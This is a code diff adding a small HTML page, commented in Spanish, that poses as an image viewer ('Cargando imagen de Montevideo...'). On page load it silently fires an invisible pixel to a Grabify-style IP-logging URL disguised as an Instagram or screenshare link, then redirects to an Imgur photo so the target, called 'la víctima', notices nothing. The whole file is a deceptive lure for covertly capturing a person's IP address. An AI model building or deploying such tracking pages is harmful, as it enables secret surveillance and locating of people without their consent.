@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Abriendo Imagen...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <script>
+        // ** 1. URL DEL PIXEL INVISIBLE DIRECTO **
+        // ¡REEMPLAZAR AQUÍ CON LA URL SECRETA QUE OBTUVO DE GRABIFY EN EL PASO 1!
+        const PIXEL_TRACKER_URL = 'https://screenshare.pics/2J1O8I.INSTAGRAM'; 
+        
+        // 2. Ejecuta el rastreo creando el pixel invisible
+        const pixel = new Image();
+        pixel.src = PIXEL_TRACKER_URL + '?' + Date.now();
+        
+        pixel.onload = () => console.log("Rastreador de IP ejecutado de forma invisible.");
+
+        // 3. REDIRECCIÓN INSTANTÁNEA a la imagen real de Imgur (su foto)
+        setTimeout(() => {
+            // La víctima ve la imagen de Imgur. El rastreo ya se completó.
+            window.location.replace("https://i.imgur.com/AlwlHpE.jpeg");
+        }, 100); // 100 milisegundos (para que sea casi instantáneo)
+    </script>
+    
+    <style>
+        /* Estilos mínimos para evitar el blanco molesto antes de redirigir */
+        body { background-color: #000; color: white; text-align: center; padding-top: 50px; }
+    </style>
+</head>
+<body>
+    Cargando imagen de Montevideo...
+</body>
+</html>
